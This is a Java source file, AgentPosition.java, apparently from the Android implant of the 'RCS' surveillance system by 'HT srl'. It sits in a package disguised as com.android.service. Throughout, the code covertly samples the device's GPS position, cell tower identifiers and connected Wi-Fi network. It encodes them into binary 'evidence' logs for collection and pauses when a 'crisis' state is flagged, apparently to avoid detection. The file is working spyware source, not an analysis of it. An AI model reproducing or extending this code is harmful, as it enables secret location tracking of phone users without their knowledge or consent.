/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentPosition.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.agent;

import java.io.IOException;
import java.util.Date;

import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;

import com.android.service.CellInfo;
import com.android.service.Device;
import com.android.service.LogR;
import com.android.service.Status;
import com.android.service.agent.position.GPSLocator;
import com.android.service.agent.position.GPSLocatorPeriod;
import com.android.service.auto.Cfg;
import com.android.service.conf.Configuration;
import com.android.service.evidence.Evidence;
import com.android.service.evidence.EvidenceType;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;
import com.android.service.util.DateTime;
import com.android.service.util.Utils;

public class AgentPosition extends AgentBase implements LocationListener {
	private static final String TAG = "AgentPosition";
	private static final int TYPE_GPS = 1;
	private static final int TYPE_CELL = 2;
	private static final int TYPE_WIFI = 4;

	private static final int LOG_TYPE_GPS = 1;
	private static final int LOG_TYPE_GSM = 2;
	private static final int LOG_TYPE_WIFI = 3;
	private static final int LOG_TYPE_IP = 4;
	private static final int LOG_TYPE_CDMA = 5;
	private static final long POSITION_DELAY = 1000;

	GPSLocator locator;

	private boolean gpsEnabled;
	private boolean cellEnabled;
	private boolean wifiEnabled;

	int period;

	@Override
	public void begin() {

		locator = new GPSLocatorPeriod(this, period);
		locator.start();

	}

	@Override
	public void end() {
		locator.halt();
		try {
			locator.join();
		} catch (final InterruptedException e) {
			if (Cfg.DEBUG) {
				Check.log(e);
			}
		}
		locator = null;
	}

	@Override
	public boolean parse(AgentConf conf) {
		final byte[] confParameters = conf.getParams();
		final DataBuffer databuffer = new DataBuffer(confParameters, 0, confParameters.length);
		try {
			// millisecondi
			period = databuffer.readInt();
			final int type = databuffer.readInt();

			if (Configuration.GPS_ENABLED) {
				gpsEnabled = ((type & TYPE_GPS) != 0);
			} else {

				if (Cfg.DEBUG) {
					Check.log(TAG + " Warn: " + "GPS Disabled at compile time");
				}

			}
			cellEnabled = ((type & TYPE_CELL) != 0);
			wifiEnabled = ((type & TYPE_WIFI) != 0);

			if (Cfg.DEBUG) {
				Check.asserts(period > 0, "parse period: " + period);
				// if(Cfg.DEBUG) Check.asserts(type == 1 || type == 2 || type ==
				// 4, "parse type: "
				// + type);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "Type: " + type);
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "Period: " + period);
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "gpsEnabled: " + gpsEnabled);
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "cellEnabled: " + cellEnabled);
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "wifiEnabled: " + wifiEnabled);
			}

			setPeriod(period);
			setDelay(POSITION_DELAY);

		} catch (final IOException e) {

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + e.toString());
			}

			return false;
		}

		return true;
	}

	@Override
	public void go() {

		if (Status.self().crisisPosition()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Warn: " + "Crisis!");
			}
			return;
		}

		if (gpsEnabled) {

			if (Cfg.DEBUG) {
				Check.log(TAG + " actualRun: gps");
			}

			locationGPS();
		}
		if (cellEnabled) {

			if (Cfg.DEBUG) {
				Check.log(TAG + " actualRun: cell");
			}

			locationCELL();
		}
		if (wifiEnabled) {

			if (Cfg.DEBUG) {
				Check.log(TAG + " actualRun: wifi");
			}

			locationWIFI();
		}
	}

	private void locationWIFI() {
		final WifiManager wifiManager = (WifiManager) Status.getAppContext().getSystemService(Context.WIFI_SERVICE);

		final WifiInfo wifi = wifiManager.getConnectionInfo();

		if (wifi != null && wifi.getBSSID() != null) {

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "Wifi: " + wifi.getBSSID());
			}

			final byte[] payload = getWifiPayload(wifi.getBSSID(), wifi.getSSID(), wifi.getRssi());

			new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(1, LOG_TYPE_WIFI), payload);

			// logWifi.createEvidence(getAdditionalData(1, LOG_TYPE_WIFI),
			// EvidenceType.LOCATION_NEW);
			// logWifi.writeEvidence(payload);
			// logWifi.close();
		} else {

			if (Cfg.DEBUG) {
				Check.log(TAG + " Warn: " + "Wifi disabled");
			}

		}

	}

	/**
	 * http://stackoverflow.com/questions/3868223/problem-with-
	 * neighboringcellinfo-cid-and-lac
	 */
	private void locationCELL() {

		final CellInfo info = Device.getCellInfo();
		if (!info.valid) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + "invalid cell info");
			}
			return;
		}

		if (info.gsm) {
			final byte[] payload = getCellPayload(info, LOG_TYPE_GSM);
			new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(0, LOG_TYPE_GSM), payload);
		}
		if (info.cdma) {
			final byte[] payload = getCellPayload(info, LOG_TYPE_CDMA);
			new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(0, LOG_TYPE_CDMA), payload);
		}
	}

	private void locationGPS() {
		if (locator == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + "GPS Not Supported on Device");
			}
			return;
		}

		if (lastLocation == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " waitingForPoint");
			}

			return;
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " newLocation");
		}

		byte[] payload;
		synchronized (this) {
			final long timestamp = lastLocation.getTime();

			if (Cfg.DEBUG) {
				Check.log(TAG + " valid");
			}

			payload = getGPSPayload(lastLocation, timestamp);
			lastLocation = null;
		}

		new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(0, LOG_TYPE_GPS), payload);

		/*
		 * Evidence logGPS = new Evidence(EvidenceType.LOCATION_NEW);
		 * logGPS.createEvidence(getAdditionalData(0, LOG_TYPE_GPS),
		 * EvidenceType.LOCATION_NEW); logGPS.writeEvidence(payload);
		 * logGPS.close();
		 */

	}

	Location lastLocation;

	public void onLocationChanged(Location location) {
		if (location != null) {
			final double lat = location.getLatitude();
			final double lng = location.getLongitude();
			if (Cfg.DEBUG) {
				Check.log(TAG + " lat: " + lat + " lon:" + lng);
			}
		}
		synchronized (this) {
			lastLocation = location;
		}

	}

	public void onProviderDisabled(String arg0) {
		// TODO Auto-generated method stub

	}

	public void onProviderEnabled(String arg0) {
		// TODO Auto-generated method stub

	}

	public void onStatusChanged(String arg0, int arg1, Bundle arg2) {
		// TODO Auto-generated method stub

	}

	private byte[] getAdditionalData(int structNum, int type) {

		final int addsize = 12;
		final byte[] additionalData = new byte[addsize];
		final DataBuffer addbuffer = new DataBuffer(additionalData, 0, additionalData.length);
		final int version = 2010082401;

		addbuffer.writeInt(version);
		addbuffer.writeInt(type);
		addbuffer.writeInt(structNum);

		if (Cfg.DEBUG) {
			Check.ensures(addbuffer.getPosition() == addsize, "addbuffer wrong size");
		}

		return additionalData;
	}

	private byte[] messageEvidence(byte[] payload, int type) {

		if (Cfg.DEBUG) {
			Check.requires(payload != null, "saveEvidence payload!= null");
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " saveEvidence payload: " + payload.length);
		}

		final int version = 2008121901;
		final Date date = new Date();
		final int payloadSize = payload.length;
		final int size = payloadSize + 24;

		final byte[] message = new byte[size];

		final DataBuffer databuffer = new DataBuffer(message, 0, size);

		databuffer.writeInt(type);

		// header
		databuffer.writeInt(size);
		databuffer.writeInt(version);
		databuffer.writeLong(DateTime.getFiledate(date));

		// payload
		databuffer.write(payload);

		// delimiter
		databuffer.writeInt(Evidence.EVIDENCE_DELIMITER);

		if (Cfg.DEBUG) {
			Check.ensures(databuffer.getPosition() == size, "saveEvidence wrong size");
		}

		// save log

		return message;

	}

	private byte[] getWifiPayload(String bssid, String ssid, int signalLevel) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " getWifiPayload bssid: " + bssid + " ssid: " + ssid + " signal:" + signalLevel);
		}
		final int size = 48;
		final byte[] payload = new byte[size];

		final DataBuffer databuffer = new DataBuffer(payload, 0, payload.length);

		for (int i = 0; i < 6; i++) {
			final byte[] token = Utils.hexStringToByteArray(bssid, i * 3, 2);

			// debug.trace("getWifiPayload " + i + " : "
			// + Utils.byteArrayToHex(token));

			if (Cfg.DEBUG) {
				Check.asserts(token.length == 1, "getWifiPayload: token wrong size");
			}

			databuffer.writeByte(token[0]);
		}

		// PAD
		databuffer.writeByte((byte) 0);
		databuffer.writeByte((byte) 0);

		final byte[] ssidcontent = ssid.getBytes();
		final int len = ssidcontent.length;
		final byte[] place = new byte[32];

		for (int i = 0; i < (Math.min(32, len)); i++) {
			place[i] = ssidcontent[i];
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " getWifiPayload ssidcontent.length: " + ssidcontent.length);
		}

		databuffer.writeInt(ssidcontent.length);

		databuffer.write(place);

		databuffer.writeInt(signalLevel);

		if (Cfg.DEBUG) {
			Check.ensures(databuffer.getPosition() == size, "databuffer.getPosition wrong size");
		}

		if (Cfg.DEBUG) {
			Check.ensures(payload.length == size, "payload wrong size");
		}

		return payload;
	}

	private byte[] getCellPayload(CellInfo info, int logType) {
		if (Cfg.DEBUG) {
			Check.requires(info.valid, "invalid cell info");
		}

		final int size = 19 * 4 + 48 + 16;
		final byte[] cellPosition = new byte[size];

		final DataBuffer databuffer = new DataBuffer(cellPosition, 0, cellPosition.length);

		databuffer.writeInt(size); // size
		databuffer.writeInt(0); // params

		databuffer.writeInt(info.mcc); //
		databuffer.writeInt(info.mnc); //
		databuffer.writeInt(info.lac); //
		databuffer.writeInt(info.cid); //

		databuffer.writeInt(0); // bsid
		databuffer.writeInt(0); // bcc

		databuffer.writeInt(info.rssi); // rx level
		databuffer.writeInt(0); // rx level full
		databuffer.writeInt(0); // rx level sub

		databuffer.writeInt(0); // rx quality
		databuffer.writeInt(0); // rx quality full
		databuffer.writeInt(0); // rx quality sub

		databuffer.writeInt(0); // idle timeslot
		databuffer.writeInt(0); // timing advance
		databuffer.writeInt(0); // gprscellid
		databuffer.writeInt(0); // gprs basestationid
		databuffer.writeInt(0); // num bcch

		databuffer.write(new byte[48]); // BCCH
		databuffer.write(new byte[16]); // NMR

		if (Cfg.DEBUG) {
			Check.ensures(databuffer.getPosition() == size, "getCellPayload wrong size");
		}

		return messageEvidence(cellPosition, logType);

	}

	/**
	 * @param timestamp
	 */
	private byte[] getGPSPayload(Location loc, long timestamp) {

		if (Cfg.DEBUG) {
			Check.log(TAG + " getGPSPayload");
		}

		final Date date = new Date(timestamp);

		final double latitude = loc.getLatitude();
		final double longitude = loc.getLongitude();
		final double altitude = loc.getAltitude();
		final float hdop = loc.getAccuracy();
		final float vdop = 0;
		final float speed = loc.getSpeed();
		final float course = loc.getBearing();

		if (Cfg.DEBUG) {
			Check.log(TAG + " " + " " + speed + "|" + latitude + "|" + longitude + "|" + course + "|" + date);
		}

		final DateTime dateTime = new DateTime(date);

		// define GPS_VALID_UTC_TIME 0x00000001
		// define GPS_VALID_LATITUDE 0x00000002
		// define GPS_VALID_LONGITUDE 0x00000004
		// define GPS_VALID_SPEED 0x00000008
		// define GPS_VALID_HEADING 0x00000010
		// define GPS_VALID_HORIZONTAL_DILUTION_OF_PRECISION 0x00000200
		// define GPS_VALID_VERTICAL_DILUTION_OF_PRECISION 0x00000400
		final int validFields = 0x00000400 | 0x00000200 | 0x00000010 | 0x00000008 | 0x00000004 | 0x00000002
				| 0x00000001;

		final int size = 344;
		// struct GPS_POSITION
		final byte[] gpsPosition = new byte[size];

		final DataBuffer databuffer = new DataBuffer(gpsPosition, 0, gpsPosition.length);

		// struct GPS_POSITION
		databuffer.writeInt(0); // version
		databuffer.writeInt(size); // sizeof GPS_POSITION == 344
		databuffer.writeInt(validFields); // validFields
		databuffer.writeInt(0); // flags

		// ** Time related : 16 bytes
		databuffer.write(dateTime.getStructSystemdate()); // SYSTEMTIME

		// ** Position + heading related
		databuffer.writeDouble(latitude); // latitude
		databuffer.writeDouble(longitude); // longitude
		databuffer.writeFloat(speed); // speed
		databuffer.writeFloat(course); // heading
		databuffer.writeDouble(0); // Magnetic variation
		databuffer.writeFloat((float) altitude); // altitude
		databuffer.writeFloat(0); // altitude ellipsoid

		// ** Quality of this fix
		databuffer.writeInt(1); // GPS_FIX_QUALITY GPS
		databuffer.writeInt(2); // GPS_FIX_TYPE 3D
		databuffer.writeInt(0); // GPS_FIX_SELECTION
		databuffer.writeFloat(0); // PDOP
		databuffer.writeFloat(hdop); // HDOP
		databuffer.writeFloat(vdop); // VDOP

		// ** Satellite information
		databuffer.writeInt(0); // satellite used
		databuffer.write(new byte[48]); // prn used 12 int
		databuffer.writeInt(0); // satellite view
		databuffer.write(new byte[48]); // prn view
		databuffer.write(new byte[48]); // elevation in view
		databuffer.write(new byte[48]); // azimuth view
		databuffer.write(new byte[48]); // sn view

		if (Cfg.DEBUG) {
			Check.log(TAG + " len: " + databuffer.getPosition());
		}

		if (Cfg.DEBUG) {
			Check.ensures(databuffer.getPosition() == size, "saveGPSLog wrong size: " + databuffer.getPosition());
		}

		return messageEvidence(gpsPosition, LOG_TYPE_GPS);

	}

}
